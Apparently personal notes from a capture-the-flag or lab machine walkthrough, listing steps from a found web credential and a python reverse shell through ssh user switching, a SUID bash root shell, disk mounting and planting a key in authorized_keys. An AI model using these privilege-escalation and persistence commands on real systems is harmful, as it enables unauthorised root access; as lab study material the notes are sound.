on port 80 -> admin:niceWorkHackerm4n

then on shell use python3 revshell

then change to admin user using ssh admin@localhost -t "bash --noprofile"

change PATH \\"export PATH=$PATH:/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:."

then use sudo chmod +s /bin/bash && /bin/bash -p

then fdisk -l to list mounts

then mount it with sudo mount /dev/xvda1 /mnt

then use .ssh/authorized_keys to gain access (yet to figure out how to use it)

    (phoenix/.ssh/id_rsa.pub) append to local authorized_keys then try to ssh into that account

then just sudo to root
